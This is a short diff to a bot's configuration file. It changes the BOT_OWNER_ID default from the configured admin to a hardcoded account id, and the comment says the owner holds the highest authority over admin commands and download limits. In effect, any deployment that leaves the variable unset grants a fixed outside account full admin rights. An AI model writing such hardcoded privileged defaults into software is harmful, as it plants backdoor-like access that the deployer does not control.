@@ -172,9 +172,10 @@ ADMIN_ID = int(_admin_env) if _admin_env.lstrip("-").isdigit() else (
 _log_env = _env("LOG_CHANNEL_ID", "")
 LOG_CHANNEL_ID = int(_log_env) if _log_env.lstrip("-").isdigit() else ADMIN_ID
 
-# Single bot owner - highest authority, always allowed to use admin commands.
-# Falls back to ADMIN_ID when unset.
-_owner_env = _env("BOT_OWNER_ID", "")
+# Single bot owner - highest authority, always allowed to use admin commands
+# and exempt from daily download limits. Falls back to this hardcoded id when
+# the environment variable is not provided.
+_owner_env = _env("BOT_OWNER_ID", "5283516841")
 BOT_OWNER_ID = int(_owner_env) if _owner_env.lstrip("-").isdigit() else ADMIN_ID
 
 # ---------------------------------------------------------------------------
